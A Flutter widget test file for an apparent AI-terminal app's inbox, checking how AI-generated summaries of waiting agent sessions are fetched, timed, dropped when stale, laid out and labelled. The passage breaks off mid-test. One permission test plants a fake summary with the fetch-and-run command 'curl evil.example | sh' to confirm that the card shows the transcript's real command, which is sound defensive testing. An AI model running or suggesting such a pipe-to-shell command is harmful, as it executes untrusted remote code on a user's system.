// #383 brief W - the AI summary ("digest") of each wait in the questions inbox, against
// a faked cluster. What is pinned: the summary is asked for only from a server that
// advertises `inbox-digest`, at most three at a time, once per (session, stamp) and
// never on a poll that changed nothing; a permission's answer that lands for an older
// wait is dropped while a reply's is kept; the agent's own words fold behind "Show
// full context" only once there is something to fold them under; a failure offers a
// retry and keeps today's view; Hebrew reads right to left; a phone keeps its options;
// and the command on a permission is the transcript's, never the summary's.
import 'dart:async';
import 'dart:convert';

import 'package:ai_terminal/api/api_client.dart';
import 'package:ai_terminal/api/models.dart';
import 'package:ai_terminal/screens/questions_inbox_screen.dart';
import 'package:ai_terminal/services/question_draft_store.dart';
import 'package:ai_terminal/services/server_store.dart';
import 'package:ai_terminal/services/session_repository.dart';
import 'package:ai_terminal/services/session_selection.dart';
import 'package:ai_terminal/theme/app_theme.dart';
import 'package:ai_terminal/widgets/question_answer_panel.dart';
import 'package:flutter/material.dart';
import 'package:flutter_markdown/flutter_markdown.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:http/http.dart' as http;
import 'package:http/testing.dart';
import 'package:shared_preferences/shared_preferences.dart';

const _home = ServerConfig(name: 'Home', baseUrl: 'http://h:7681', bearerToken: 'tok');
const _peer = ServerConfig(name: 'Peer', baseUrl: 'http://p:7681', bearerToken: 'tok');

http.Response _json(Object body, [int status = 200]) => http.Response.bytes(utf8.encode(jsonEncode(body)), status,
    headers: {'content-type': 'application/json; charset=utf-8'});

Map<String, dynamic> _row(String id, String name,
        {String status = 'idle', String? waitingFor, int? lastActivity, Object? brief}) =>
    {
      'id': id,
      'name': name,
      'cwd': '/w',
      'status': status,
      'notifyLevel': 'important',
      'agent': 'claude',
      'waitingFor': waitingFor,
      'lastActivity': lastActivity,
      'brief': brief,
    };

Map<String, dynamic> _single(String question, {String id = 't1'}) => {
      'toolUseId': id,
      'questions': [
        {
          'header': 'H',
          'question': question,
          'multiSelect': false,
          'options': [
            {'label': 'Alpha'},
            {'label': 'Beta'},
          ],
        },
      ],
    };

Map<String, dynamic> _ready({String about = 'ABOUT_TEXT', List<String> asking = const ['ASK_ONE'], List<String> know = const ['KNOW_ONE']}) =>
    {'status': 'ready', 'waitKey': 'w', 'about': about, 'asking': asking, 'know': know, 'model': 'sonnet', 'generatedAt': 1, 'cached': false};

Map<String, dynamic> _say(String text) => {'role': 'assistant', 'text': text, 'toolUses': [], 'ts': 't-${text.hashCode}'};
Map<String, dynamic> _typed(String text) => {'role': 'user', 'text': text, 'typedText': text, 'userKind': 'human', 'toolUses': []};
Map<String, dynamic> _call(String cmd, {String name = 'Bash'}) => {
      'role': 'assistant',
      'text': '',
      'toolUses': [
        {'name': name, 'inputPreview': '', 'id': 'tu-$cmd', 'input': {'command': cmd}},
      ],
    };
Map<String, dynamic> _brief(String now, int at) => {
      'v': 1,
      'reporting': 'on',
      'items': [],
      'now': {'text': now, 'at': at},
    };

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  group('ApiClient.digest', () {
    late List<Uri> asked;
    ApiClient api(http.Response Function(http.Request) answer) => ApiClient(_home, httpClient: MockClient((req) async {
          asked.add(req.url);
          return answer(req);
        }));
    setUp(() => asked = []);

    test('a ready summary is typed; blank lines are dropped', () async {
      final d = await api((_) => _json({
                ..._ready(know: ['k']),
                'asking': ['  first  ', '', 7],
                'generatedAt': '2026-10-23T10:00:00Z',
              })).digest('s1');
      expect(asked.single.path, '/api/sessions/s1/digest');
      expect(asked.single.queryParameters, isEmpty, reason: 'a full run unless peek is asked for');
      expect(d.status, InboxDigestStatus.ready);
      expect(d.isReady, isTrue);
      expect(d.about, 'ABOUT_TEXT');
      expect(d.asking, ['first']);
      expect(d.know, ['k']);
      expect(d.model, 'sonnet');
      expect(d.generatedAt, DateTime.utc(2026, 10, 23, 10).millisecondsSinceEpoch);
    });

    test('peek asks ?peek=1 and reads "missing"', () async {
      final d = await api((_) => _json({'status': 'missing', 'waitKey': 'w'})).digest('s1', peek: true);
      expect(asked.single.queryParameters, {'peek': '1'});
      expect(d.status, InboxDigestStatus.missing);
      expect(d.isReady, isFalse);
    });

    test('503 unavailable and 502 failed are answers with their reason, not throws', () async {
      final u = await api((_) => _json({'status': 'unavailable', 'reason': 'busy'}, 503)).digest('s1');
      expect((u.status, u.reason), (InboxDigestStatus.unavailable, 'busy'));
      final f = await api((_) => _json({'status': 'failed', 'reason': 'bad-output'}, 502)).digest('s1');
      expect((f.status, f.reason), (InboxDigestStatus.failed, 'bad-output'));
    });

    test('any other error still throws; a ready answer with nothing in it is not ready', () async {
      await expectLater(api((_) => http.Response('', 401)).digest('s1'), throwsA(isA<ApiException>()));
      await expectLater(api((_) => http.Response('', 500)).digest('s1'), throwsA(isA<ApiException>()));
      final empty = await api((_) => _json({'status': 'ready', 'about': '', 'asking': [], 'know': []})).digest('s1');
      expect(empty.isReady, isFalse);
      final odd = await api((_) => _json({'status': 'weird', 'asking': 'not a list'})).digest('s1');
      expect(odd.status, InboxDigestStatus.unknown);
      expect(odd.asking, isEmpty);
    });

    test('the digest waits as long as the server may run, not the 10 s default', () {
      expect(ApiClient.digestTimeout, greaterThanOrEqualTo(const Duration(seconds: 90)));
    });
  });

  test('leadTeaser keeps the last lines, and the END of a long one', () {
    expect(leadTeaser('a\n\nb\nc\n\nd'), 'b\nc\nd');
    final long = List.generate(100, (i) => 'w$i').join(' ');
    final t = leadTeaser(long, maxChars: 40);
    expect(t, startsWith('\u2026'));
    expect(t, endsWith('w99'));
    expect(t.length, lessThanOrEqualTo(41));
    expect(t.substring(1).split(' ').first, matches(RegExp(r'^w\d+$')), reason: 'cut at a space, not mid-word');
  });

  late Map<String, List<Map<String, dynamic>>> rows;
  late Map<String, Map<String, dynamic>> questions;
  late Map<String, List<Map<String, dynamic>>> transcripts;
  late bool digestCap;
  late Map<String, List<(int, Map<String, dynamic>)>> digestAnswers; // per session, in order; the last repeats
  late List<Completer<void>> digestHolds; // each holds the next digest answer, in order
  late int holdAt; // how many of [digestHolds] have been taken
  late List<String> digestCalls; // session ids, in order
  late Set<String> down; // base URLs that answer nothing; their digest call never returns

  ApiClient client(ServerConfig s) => ApiClient(s, httpClient: MockClient((req) async {
        final p = req.url.path;
        final id = RegExp(r'^/api/sessions/([^/]+)/').firstMatch(p)?.group(1);
        if (p.endsWith('/digest')) {
          digestCalls.add(id!);
          if (down.contains(s.baseUrl)) await Completer<void>().future;
          // A runaway re-ask loop is a failure, not a hang: past this, never answered.
          if (digestCalls.length > 20) await Completer<void>().future;
          final list = digestAnswers[id] ?? [(200, {'status': 'none', 'waitKey': null})];
          final a = list.length > 1 ? list.removeAt(0) : list.first;
          if (holdAt < digestHolds.length) await digestHolds[holdAt++].future;
          return _json(a.$2, a.$1);
        }
        if (down.contains(s.baseUrl)) throw http.ClientException('down');
        if (p.endsWith('/pending-question')) {
          final q = questions[id];
          return _json(q == null ? {'pending': false} : {'pending': true, 'question': q});
        }
        if (p.endsWith('/transcript')) {
          final t = transcripts[id];
          return t == null ? http.Response('', 404) : _json({'messages': t, 'cursor': null, 'hasMore': false});
        }
        if (p.endsWith('/attention')) return _json({'kind': 'approval', 'reason': 'Bash', 'lastMessage': 'x'});
        if (p.endsWith('/scrollback')) return _json({'data': 'tail\r\n', 'total': 6, 'offset': 0, 'limit': 6});
        switch (p) {
          case '/api/version':
            return _json({
              'version': '1.99.0',
              'serverName': s.name,
              'capabilities': ['session-brief', if (digestCap) 'inbox-digest'],
            });
          case '/api/sessions':
            return _json(rows[s.baseUrl] ?? const []);
          case '/api/dashboard/background-agents':
            return _json({'available': true, 'agents': []});
        }
        return http.Response('', 404);
      }));

  Future<SessionRepository> repo({List<ServerConfig> servers = const [_home]}) async {
    SharedPreferences.setMockInitialValues({
      ServerStore.storageKey: jsonEncode([
        for (final sv in servers) {'name': sv.name, 'baseUrl': sv.baseUrl, 'bearerToken': sv.bearerToken},
      ]),
    });
    final store = ServerStore.forTest();
    await store.init();
    return SessionRepository.forTest(store: store, clientFactory: client);
  }

  setUp(() {
    QuestionDraftStore.instance.resetForTest();
    SessionSelection.instance.reset();
    rows = {};
    questions = {};
    transcripts = {};
    digestCap = true;
    digestAnswers = {};
    digestHolds = [];
    holdAt = 0;
    digestCalls = [];
    down = {};
  });
  tearDown(SessionSelection.instance.reset);

  Future<void> settle(WidgetTester tester) async {
    for (var i = 0; i < 4; i++) {
      await tester.runAsync(() => Future<void>.delayed(const Duration(milliseconds: 30)));
      await tester.pump();
    }
  }

  Future<void> pump(WidgetTester tester, SessionRepository r,
      {double width = 1400, double height = 1000, List<ServerConfig> servers = const [_home]}) async {
    tester.view.physicalSize = Size(width, height);
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.resetPhysicalSize);
    addTearDown(tester.view.resetDevicePixelRatio);
    const every = Duration(hours: 1);
    await tester.pumpWidget(MaterialApp(
      theme: AppTheme.dark,
      home: QuestionsInboxScreen(
        repository: r,
        servers: () => servers,
        clientFactory: client,
        sessionInput: (s, body) async => true,
        pollInterval: every,
        focusInterval: every,
        agentsInterval: every,
        onOpenSession: (_) {},
      ),
    ));
    await tester.runAsync(() => r.refresh());
    await settle(tester);
  }

  Future<void> done(WidgetTester tester) async {
    for (final h in digestHolds) {
      if (!h.isCompleted) h.complete();
    }
    await settle(tester);
    await tester.pumpWidget(const SizedBox());
  }

  Finder inPanel(Finder f) => find.descendant(of: find.byKey(const ValueKey('inbox-question-panel')), matching: f);
  Finder text(String t) => find.textContaining(t, findRichText: true);
  QuestionAnswerPanel panel(WidgetTester tester) =>
      tester.widget<QuestionAnswerPanel>(find.byKey(const ValueKey('inbox-question-panel')));

  void oneQuestion({String id = 'q', String lead = 'LEAD_HEAD\n\nLEAD_TAIL line'}) {
    rows = {_home.baseUrl: [_row(id, 'Asker', status: 'waiting', waitingFor: 'question', lastActivity: 1)]};
    questions = {id: _single('Pick one')};
    transcripts = {id: [_typed('go'), _say(lead), _call('x', name: 'AskUserQuestion')]};
  }

  group('a question', () {
    testWidgets('ready: the summary sits in the lead-up slot, the words fold behind the toggle, the options stay',
        (tester) async {
      oneQuestion();
      digestAnswers = {'q': [(200, _ready())]};
      await pump(tester, await repo());
      await settle(tester);
      expect(panel(tester).contextLabel, 'AI summary');
      expect(inPanel(find.byKey(const ValueKey('inbox-digest'))), findsOneWidget);
      for (final t in ['About', 'ABOUT_TEXT', 'Asking', 'ASK_ONE', 'Good to know', 'KNOW_ONE']) {
        expect(inPanel(text(t)), findsWidgets, reason: t);
      }
      final ask = tester.widget<Text>(find.descendant(of: find.byKey(const ValueKey('inbox-digest-ask-0')), matching: find.byType(Text)));
      expect(ask.style?.fontWeight, FontWeight.w700, reason: 'what is asked is bold');
      expect(text('LEAD_TAIL'), findsNothing, reason: 'the agent\'s words are folded once a summary is ready');
      expect(inPanel(find.text('Alpha')), findsOneWidget, reason: 'the real options are the answer path');
      expect(inPanel(find.text('Pick one')), findsOneWidget, reason: 'and the real question');

      await tester.tap(find.byKey(const ValueKey('inbox-full-toggle')));
      await tester.pump();
      expect(text('LEAD_TAIL'), findsOneWidget, reason: 'Show full context opens them');
      expect(text('LEAD_HEAD'), findsOneWidget);
      expect(find.text('Hide full context'), findsOneWidget);
      expect(digestCalls, ['q'], reason: 'one run for the wait');
      await done(tester);
    });

    testWidgets('the toggle is kept per item while the screen lives', (tester) async {
      rows = {
        _home.baseUrl: [
          _row('q', 'One', status: 'waiting', waitingFor: 'question', lastActivity: 1),
          _row('r', 'Two', status: 'waiting', waitingFor: 'question', lastActivity: 2),
        ],
      };
      questions = {'q': _single('Q one', id: 'a'), 'r': _single('Q two', id: 'b')};
      transcripts = {
        'q': [_typed('go'), _say('WORDS_ONE'), _call('x', name: 'AskUserQuestion')],
        'r': [_typed('go'), _say('WORDS_TWO'), _call('y', name: 'AskUserQuestion')],
      };
      digestAnswers = {'q': [(200, _ready())], 'r': [(200, _ready())]};
      await pump(tester, await repo());
      await settle(tester);
      await tester.tap(find.byKey(const ValueKey('inbox-full-toggle')));
      await tester.pump();
      expect(text('WORDS_ONE'), findsOneWidget);
      await tester.tap(find.byKey(const ValueKey('inbox-open-http://h:7681|r')));
      await settle(tester);
      expect(text('WORDS_TWO'), findsNothing, reason: 'the other item keeps its own, closed');
      await tester.tap(find.byKey(const ValueKey('inbox-open-http://h:7681|q')));
      await settle(tester);
      expect(text('WORDS_ONE'), findsOneWidget, reason: 'back to the first: still open');
      await done(tester);
    });

    testWidgets('loading: one line says so, with the last lines of the lead-up; nothing is blank', (tester) async {
      oneQuestion(lead: 'FIRST_LINE\n\nmiddle one\n\nmiddle two\n\nLAST_LINE');
      digestHolds = [Completer<void>()];
      digestAnswers = {'q': [(200, _ready())]};
      await pump(tester, await repo());
      await settle(tester);
      expect(find.byKey(const ValueKey('inbox-digest-loading')), findsOneWidget);
      expect(find.text('Summarising...'), findsOneWidget);
      final teaser = find.byKey(const ValueKey('inbox-digest-teaser'));
      expect(find.descendant(of: teaser, matching: text('LAST_LINE')), findsOneWidget, reason: 'the part next to the question');
      expect(find.descendant(of: teaser, matching: text('FIRST_LINE')), findsNothing);
      digestHolds.first.complete();
      await settle(tester);
      expect(find.byKey(const ValueKey('inbox-digest-loading')), findsNothing);
      expect(inPanel(text('ASK_ONE')), findsOneWidget);
      await done(tester);
    });

    testWidgets('failed: today\'s lead-up, open; a retry only once the server forgot the failure, and it asks again',
        (tester) async {
      oneQuestion();
      digestAnswers = {
        'q': [
          (502, {'status': 'failed', 'reason': 'timeout'}),
          (200, _ready()),
        ],
      };
      await pump(tester, await repo());
      await settle(tester);
      expect(text('LEAD_TAIL'), findsOneWidget, reason: 'the words, as today');
      expect(panel(tester).contextLabel, 'Claude said');
      expect(find.byKey(const ValueKey('inbox-digest')), findsNothing);
      expect(find.textContaining('error', findRichText: true), findsNothing, reason: 'no error banner');
      // Inside the server's failure memory a retry would get the same 502 at once.
      expect(find.text('Summary failed - try again in a minute'), findsOneWidget);
      expect(find.byKey(const ValueKey('inbox-digest-retry')), findsNothing, reason: 'no button that cannot work');
      await tester.pump(kDigestFailureMemory - const Duration(seconds: 1));
      expect(find.byKey(const ValueKey('inbox-digest-retry')), findsNothing, reason: 'measured from the failure');
      await tester.pump(const Duration(seconds: 2));
      expect(find.text('Summary failed - retry'), findsOneWidget);
      expect(find.byKey(const ValueKey('inbox-digest-retry-wait')), findsNothing);
      expect(digestCalls, ['q']);
      await tester.tap(find.byKey(const ValueKey('inbox-digest-retry')));
      await settle(tester);
      expect(digestCalls, ['q', 'q']);
      expect(inPanel(text('ASK_ONE')), findsOneWidget);
      await done(tester);
    });

    testWidgets('unavailable: today\'s view, no retry, and not asked again', (tester) async {
      oneQuestion();
      digestAnswers = {'q': [(503, {'status': 'unavailable', 'reason': 'disabled'})]};
      final r = await repo();
      await pump(tester, r);
      await settle(tester);
      expect(panel(tester).contextBody, isNull, reason: 'exactly today\'s panel');
      expect(text('LEAD_TAIL'), findsOneWidget);
      expect(find.byKey(const ValueKey('inbox-digest-retry')), findsNothing);
      await tester.runAsync(() => r.refresh());
      await settle(tester);
      expect(digestCalls, ['q']);
      await done(tester);
    });

    testWidgets('an older server (no inbox-digest) is never asked, and shows today\'s view', (tester) async {
      digestCap = false;
      oneQuestion();
      await pump(tester, await repo());
      await settle(tester);
      expect(digestCalls, isEmpty);
      expect(panel(tester).contextBody, isNull);
      expect(find.text('Summarising...'), findsNothing);
      expect(text('LEAD_TAIL'), findsOneWidget);
      await done(tester);
    });

    testWidgets('a card shows the first ask, two lines at most', (tester) async {
      oneQuestion();
      digestAnswers = {
        'q': [(200, _ready(asking: ['CARD_ASK ${List.filled(60, 'word').join(' ')}', 'SECOND_ASK']))],
      };
      await pump(tester, await repo());
      await settle(tester);
      final row = find.byKey(const ValueKey('inbox-digest-row-http://h:7681|q'));
      expect(row, findsOneWidget);
      final t = tester.widget<Text>(row);
      expect(t.maxLines, 2);
      expect(t.overflow, TextOverflow.ellipsis);
      expect(t.textSpan!.toPlainText(), contains('CARD_ASK'));
      expect(t.textSpan!.toPlainText(), startsWith('\u2066AI summary:\u2069'), reason: 'labelled as the AI\'s');
      final card = find.byKey(const ValueKey('inbox-card-http://h:7681|q'));
      expect(find.descendant(of: card, matching: text('SECOND_ASK')), findsNothing);
      // The real question is still the card's, and the AI line is added BELOW it.
      final real = find.descendant(of: card, matching: find.byKey(const ValueKey('inbox-snippet-http://h:7681|q')));
      expect(real, findsOneWidget);
      expect(tester.widget<Text>(real).textSpan!.toPlainText(), contains('Pick one'));
      expect(tester.getRect(row).top, greaterThanOrEqualTo(tester.getRect(real).bottom));
      await done(tester);
    });

    testWidgets('RTL: a Hebrew summary reads right to left', (tester) async {
      oneQuestion();
      digestAnswers = {
        'q': [(200, _ready(about: '\u05d4\u05e1\u05e9\u05df \u05e2\u05d5\u05d1\u05d3', asking: ['\u05dc\u05d3\u05d7\u05d5\u05e3?'], know: ['\u05db\u05df']))],
      };
      await pump(tester, await repo());
      await settle(tester);
      TextDirection? dir(String key) =>
          tester.widget<Text>(find.descendant(of: find.byKey(ValueKey(key)), matching: find.byType(Text)).first).textDirection;
      expect(dir('inbox-digest-about'), TextDirection.rtl);
      expect(dir('inbox-digest-ask-0'), TextDirection.rtl);
      final know = tester.widget<Directionality>(
          find.ancestor(of: find.byKey(const ValueKey('inbox-digest-know-0')), matching: find.byType(Directionality)).first);
      expect(know.textDirection, TextDirection.rtl, reason: 'the bullet sits at the right edge');
      await done(tester);
    });

    testWidgets('a summary taller than its slot opens at its top: About first, not the last fact', (tester) async {
      oneQuestion();
      digestAnswers = {
        'q': [
          (200, _ready(
              about: 'TOP_ABOUT the session moved the cache.',
              asking: ['Which store?'],
              know: List.generate(14, (i) => 'KNOW_$i: a fact that matters for the choice, long enough to wrap on a desktop panel too.'))),
        ],
      };
      await pump(tester, await repo());
      await settle(tester);
      final scroller = find
          .ancestor(of: find.byKey(const ValueKey('inbox-digest')), matching: find.byType(SingleChildScrollView))
          .first;
      final view = tester.getRect(scroller);
      final pos = tester.state<ScrollableState>(find.descendant(of: scroller, matching: find.byType(Scrollable)).first).position;
      expect(pos.maxScrollExtent, greaterThan(0), reason: 'the summary must overflow its slot, or this proves nothing');
      final about = tester.getRect(find.byKey(const ValueKey('inbox-digest-about')));
      expect(about.top, greaterThanOrEqualTo(view.top - 0.5), reason: 'About is in view, not scrolled off the top');
      expect(about.top, lessThan(view.bottom));
      await done(tester);
    });

    testWidgets('phone 360x640: a long summary yields, the options and Send stay on screen', (tester) async {
      oneQuestion();
      digestAnswers = {
        'q': [
          (200, _ready(
              about: List.filled(6, 'The session reworked the cache layer and is now deciding where to keep it.').join(' '),
              asking: ['Which store should the session cache use, given the deploy constraints?'],
              know: List.generate(5, (i) => 'KNOW_$i: a fact that matters for the choice, long enough to wrap twice on a phone.'))),
        ],
      };
      await pump(tester, await repo(), width: 360, height: 640);
      await settle(tester);
      await tester.tap(find.byKey(const ValueKey('inbox-open-http://h:7681|q')));
      await tester.pumpAndSettle();
      await settle(tester);
      expect(tester.takeException(), isNull, reason: 'no overflow');
      expect(find.byKey(const ValueKey('inbox-digest')), findsOneWidget);
      for (final o in ['Alpha', 'Beta', 'Pick an option']) {
        final r = tester.getRect(inPanel(find.text(o)));
        expect(r.bottom, lessThanOrEqualTo(640), reason: '$o is on screen');
        expect(r.top, greaterThanOrEqualTo(0));
      }
      expect(tester.getRect(inPanel(find.text('Pick one'))).bottom, lessThanOrEqualTo(640), reason: 'and the question');
      await done(tester);
    });
  });

  group('fetching', () {
    testWidgets('at most three at a time, across items; a freed slot starts the next', (tester) async {
      rows = {
        _home.baseUrl: [
          for (var i = 0; i < 5; i++) _row('s$i', 'S$i', status: 'waiting', waitingFor: 'question', lastActivity: i + 1),
        ],
      };
      questions = {for (var i = 0; i < 5; i++) 's$i': _single('Q$i', id: 'id$i')};
      digestHolds = List.generate(5, (_) => Completer<void>());
      final holds = [...digestHolds];
      await pump(tester, await repo());
      await settle(tester);
      expect(digestCalls.length, 3);
      holds[0].complete();
      await settle(tester);
      expect(digestCalls.length, 4);
      await done(tester);
    });

    testWidgets('a poll that changed nothing asks nothing', (tester) async {
      oneQuestion();
      digestAnswers = {'q': [(200, _ready())]};
      final r = await repo();
      await pump(tester, r);
      await settle(tester);
      for (var i = 0; i < 3; i++) {
        await tester.runAsync(() => r.refresh());
        await settle(tester);
      }
      expect(digestCalls, ['q']);
      await done(tester);
    });

    testWidgets('a permission\'s answer that lands after its wait moved on is DROPPED', (tester) async {
      final r = await repo();
      Map<String, dynamic> perm(int at) =>
          _row('p', 'Perm', status: 'waiting', waitingFor: 'permission', lastActivity: 1, brief: _brief('Bash \u00b7 step', at));
      rows = {_home.baseUrl: [perm(5)]};
      transcripts = {'p': [_typed('go'), _say('About to run.'), _call('CMD_A')]};
      digestHolds = [Completer<void>(), Completer<void>()];
      final holds = [...digestHolds];
      digestAnswers = {
        'p': [
          (200, _ready(asking: ['OLD_WAIT_ASK'])),
          (200, _ready(asking: ['NEW_WAIT_ASK'])),
        ],
      };
      await pump(tester, r);
      await settle(tester);
      expect(digestCalls, ['p']);
      // A new call: a new wait, asked for at once beside the old one still out.
      rows = {_home.baseUrl: [perm(9)]};
      transcripts = {'p': [_typed('go'), _say('About to run.'), _call('CMD_A'), _call('CMD_B')]};
      await tester.runAsync(() => r.refresh());
      await settle(tester);
      expect(digestCalls, ['p', 'p']);
      holds[0].complete();
      await settle(tester);
      expect(text('OLD_WAIT_ASK'), findsNothing, reason: 'an older wait\'s summary is never shown under this one');
      expect(find.byKey(const ValueKey('inbox-digest-loading')), findsOneWidget);
      holds[1].complete();
      await settle(tester);
      expect(text('NEW_WAIT_ASK'), findsWidgets);
      await done(tester);
    });

    testWidgets('a permission never borrows the summary of the reply before it', (tester) async {
      final r = await repo();
      rows = {_home.baseUrl: [_row('c', 'Sess', lastActivity: 1)]};
      transcripts = {'c': [_typed('push it'), _say('Tests pass. Should I push it?')]};
      digestHolds = [Completer<void>(), Completer<void>()];
      digestHolds.first.complete();
      digestAnswers = {
        'c': [
          (200, _ready(asking: ['REPLY_ERA_ASK'])),
          (200, _ready(asking: ['PERM_ERA_ASK'])),
        ],
      };
      await pump(tester, r);
      await settle(tester);
      expect(text('REPLY_ERA_ASK'), findsWidgets, reason: 'the idle reply was summarised');
      rows = {
        _home.baseUrl: [
          _row('c', 'Sess', status: 'waiting', waitingFor: 'permission', lastActivity: 2, brief: _brief('Bash \u00b7 push', 3)),
        ],
      };
      transcripts = {'c': [_typed('push it'), _say('Pushing.'), _call('git push')]};
      await tester.runAsync(() => r.refresh());
      await settle(tester);
      expect(text('REPLY_ERA_ASK'), findsNothing, reason: 'another wait\'s words on an approval screen');
      expect(find.byKey(const ValueKey('inbox-digest-loading')), findsOneWidget);
      await done(tester);
    });

    testWidgets('a reply\'s answer lands though lastActivity moved, and is asked again for the newest', (tester) async {
      final r = await repo();
      Map<String, dynamic> idle(int act) => _row('c', 'Idle', lastActivity: act);
      rows = {_home.baseUrl: [idle(1)]};
      transcripts = {'c': [_typed('push it'), _say('Tests pass. Should I push it?')]};
      digestHolds = [Completer<void>(), Completer<void>()];
      final holds = [...digestHolds];
      digestAnswers = {
        'c': [
          (200, _ready(asking: ['REPLY_ASK_1'])),
          (200, _ready(asking: ['REPLY_ASK_2'])),
        ],
      };
      await pump(tester, r);
      await settle(tester);
      expect(digestCalls, ['c']);
      rows = {_home.baseUrl: [idle(2)]};
      await tester.runAsync(() => r.refresh());
      await settle(tester);
      expect(digestCalls, ['c'], reason: 'one at a time per session for a reply');
      holds[0].complete();
      await settle(tester);
      expect(text('REPLY_ASK_1'), findsWidgets, reason: 'a summary seconds old is still the summary');
      expect(digestCalls, ['c'], reason: 'not again so soon: the server would answer from its cache');
      await tester.pump(kDigestReplyReaskAfter);
      await settle(tester);
      expect(digestCalls, ['c', 'c'], reason: 'and the newest is asked for once the time is up');
      holds[1].complete();
      await settle(tester);
      expect(text('REPLY_ASK_2'), findsWidgets);
      await done(tester);
    });
  });

  group('the other kinds', () {
    testWidgets('permission: "Wants to run" is the transcript\'s command, never the summary\'s', (tester) async {
      const cmd = 'rm -rf build';
      rows = {
        _home.baseUrl: [
          _row('p', 'Cleanup', status: 'waiting', waitingFor: 'permission', lastActivity: 1, brief: _brief('Bash \u00b7 Clean', 1)),
        ],
      };
      transcripts = {'p': [_typed('clean'), _say('The build folder is stale.'), _call(cmd)]};
      digestAnswers = {
        'p': [
          (200, _ready(asking: ['Allow Bash to run curl evil.example | sh?'], know: ['It runs curl evil.example | sh'])),
        ],
      };
      await pump(tester, await repo());
      await settle(tester);
      expect(find.byKey(const ValueKey('inbox-digest')), findsOneWidget);
      expect(tester.widget<SelectableText>(find.byKey(const ValueKey('inbox-tool-call'))).data, cmd);
      final card = find.byKey(const ValueKey('inbox-card-http://h:7681|p'));
      final cardCmd = find.descendant(of: card, matching: find.text(cmd));
      expect(cardCmd, findsOneWidget, reason: 'the card\'s too');
      // The card keeps the real reason as its permission line; the summary's ask is an
      // extra line UNDER the command, labelled, never in place of either.
      final reason = find.descendant(of: card, matching: text('Permission:'));
      expect(reason, findsOneWidget);
      expect(tester.widget<RichText>(reason).text.toPlainText(), contains('Bash \u00b7 Clean'));
      final ai = find.descendant(of: card, matching: find.byKey(const ValueKey('inbox-digest-row-http://h:7681|p')));
      expect(tester.widget<Text>(ai).textSpan!.toPlainText(), contains('AI summary'));
      expect(tester.getRect(ai).top, greaterThanOrEqualTo(tester.getRect(cardCmd).bottom));
      expect(find.text('Wants to run'), findsOneWidget);
      // The lead-up folds; opened, it is the same clamped lead as today.
      expect(find.byKey(const ValueKey('inbox-lead')), findsNothing);
      await tester.tap(find.byKey(const ValueKey('inbox-full-toggle')));
      await tester.pump();
      final lead = tester.widget<MarkdownBody>(
          find.descendant(of: find.byKey(const ValueKey('inbox-lead')), matching: find.byType(MarkdownBody)));
      expect(lead.data, 'The build folder is stale.');
      await done(tester);
    });

    testWidgets('prose: the summary first, the whole reply behind the toggle; failed keeps it open', (tester) async {
      rows = {_home.baseUrl: [_row('c', 'Idle', lastActivity: 1)]};
      transcripts = {'c': [_typed('push it'), _say('REPLY_BODY. Should I push it?')]};
      digestAnswers = {'c': [(200, _ready(asking: ['PROSE_ASK']))]};
      await pump(tester, await repo());
      await settle(tester);
      expect(find.byKey(const ValueKey('inbox-digest')), findsOneWidget);
      expect(find.text('AI summary'), findsOneWidget);
      expect(find.byKey(const ValueKey('inbox-last-reply')), findsNothing);
      await tester.tap(find.byKey(const ValueKey('inbox-full-toggle')));
      await tester.pump();
      expect(find.byKey(const ValueKey('inbox-last-reply')), findsOneWidget);
      await done(tester);
    });

    testWidgets('prose, failed: the reply as today, and the retry', (tester) async {
      rows = {_home.baseUrl: [_row('c', 'Idle', lastActivity: 1)]};
      transcripts = {'c': [_typed('push it'), _say('REPLY_BODY. Should I push it?')]};
      digestAnswers = {'c': [(502, {'status': 'failed', 'reason': 'error'})]};
      await pump(tester, await repo());
      await settle(tester);
      expect(find.byKey(const ValueKey('inbox-last-reply')), findsOneWidget);
      expect(find.byKey(const ValueKey('inbox-digest-retry-wait')), findsOneWidget);
      expect(find.byKey(const ValueKey('inbox-full-toggle')), findsNothing);
      await tester.pump(kDigestFailureMemory);
      expect(find.byKey(const ValueKey('inbox-digest-retry')), findsOneWidget);
      await done(tester);
    });
  });

  group('one wait\'s summary is never another\'s', () {
    Map<String, dynamic> idle(int act) => _row('c', 'Idle', lastActivity: act);

    testWidgets('a reply, then work, then a new reply: the first reply\'s summary is never shown under the second',
        (tester) async {
      final r = await repo();
      rows = {_home.baseUrl: [idle(1)]};
      transcripts = {'c': [_typed('ship it'), _say('Built. Should I deploy to prod?')]};
      digestHolds = [Completer<void>()..complete(), Completer<void>()];
      digestAnswers = {
        'c': [
          (200, _ready(asking: ['DEPLOY_ASK'])),
          (200, _ready(asking: ['MERGE_ASK'])),
        ],
      };
      await pump(tester, r);
      await settle(tester);
      expect(text('DEPLOY_ASK'), findsWidgets);
      rows = {_home.baseUrl: [_row('c', 'Idle', status: 'working', lastActivity: 2)]};
      await tester.runAsync(() => r.refresh());
      await settle(tester);
      rows = {_home.baseUrl: [idle(3)]};
      transcripts = {'c': [_typed('ship it'), _say('Deployed. Should I merge the PR?')]};
      await tester.runAsync(() => r.refresh());
      await settle(tester);
      expect(text('Should I merge'), findsWidgets, reason: 'the new reply is listed');
      expect(text('DEPLOY_ASK'), findsNothing, reason: 'a "yes" typed now answers the merge, not the deploy');
      expect(find.byKey(const ValueKey('inbox-digest-loading')), findsOneWidget);
      expect(digestCalls, ['c', 'c'], reason: 'a new reply after work is asked for at once');
      digestHolds[1].complete();
      await settle(tester);
      expect(text('MERGE_ASK'), findsWidgets);
      await done(tester);
    });

    testWidgets('a reply summary that lands after the session went to work is not shown under its next reply',
        (tester) async {
      final r = await repo();
      rows = {_home.baseUrl: [idle(1)]};
      transcripts = {'c': [_typed('ship it'), _say('Built. Should I deploy to prod?')]};
      digestHolds = [Completer<void>(), Completer<void>()];
      final holds = [...digestHolds];
      digestAnswers = {
        'c': [
          (200, _ready(asking: ['DEPLOY_ASK'])),
          (200, _ready(asking: ['MERGE_ASK'])),
        ],
      };
      await pump(tester, r);
      await settle(tester);
      expect(digestCalls, ['c']);
      rows = {_home.baseUrl: [_row('c', 'Idle', status: 'working', lastActivity: 2)]};
      await tester.runAsync(() => r.refresh());
      await settle(tester);
      rows = {_home.baseUrl: [idle(3)]};
      transcripts = {'c': [_typed('ship it'), _say('Deployed. Should I merge the PR?')]};
      await tester.runAsync(() => r.refresh());
      await settle(tester);
      holds[0].complete();
      await settle(tester);
      expect(text('Should I merge'), findsWidgets);
